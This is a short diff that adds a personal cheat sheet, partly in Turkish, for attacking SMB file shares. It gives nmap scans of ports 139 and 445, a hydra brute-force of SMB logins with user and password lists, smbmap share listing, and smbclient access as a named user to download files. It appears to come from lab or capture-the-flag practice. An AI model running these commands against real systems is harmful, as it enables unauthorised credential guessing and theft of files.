@@ -1,0 +1,11 @@
+#SMB Crack#
+nmap -p 139,445 IP
+hydra -L user.txt -P pass.txt IP SMB Crack
+nmap -p0-65535 -> Tüm port tarama
+---
+smbmap -H IP
+smbmap -H 192.168.187.X -r tmp/.x0-lock
+--- SMB Dizinlerini arayabilirsin.
+smbclient //<target_ip>/share_name -U Henry
+get ile dosya çekebilirsin.
+
